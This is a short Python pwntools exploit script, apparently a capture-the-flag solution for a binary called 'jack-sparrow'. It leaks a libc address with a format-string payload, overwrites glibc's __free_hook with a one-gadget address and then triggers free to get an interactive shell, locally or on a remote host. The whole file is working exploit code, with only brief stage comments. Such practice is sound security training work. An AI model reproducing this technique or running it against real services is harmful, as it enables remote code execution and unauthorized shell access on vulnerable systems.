#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]

encode = lambda e: e if type(e) == bytes else str(e).encode()
hexleak  = lambda l: int(l[:-1] if (l[-1] == b'\n' or l[-1] == b'|') else l, 16)

exe = "./jack-sparrow"
elf = context.binary = ELF(exe)
libc = elf.libc
io = remote(sys.argv[1], int(sys.argv[2])) if args.REMOTE else process()
if args.GDB: gdb.attach(io, "b *main")

def opt(op): io.sendlineafter(b": ", encode(op))
def menu(idx): io.sendlineafter(b"$ ", encode(idx))

# Stage-1: Leak via specify_destination
menu(1)
opt("|%27$p|")
io.recvuntil(b'|')
leak = hexleak(io.recvuntil(b"|")[:-1])
libc.address = leak - 0x21c87
info("libc base @ %#x" % libc.address)

# Stage-2: Overwrite free_hook with one gadget
menu(2)
opt(libc.sym.__free_hook)
opt(libc.address + 0x4f302)

# Invoke free
menu(3)

io.interactive()
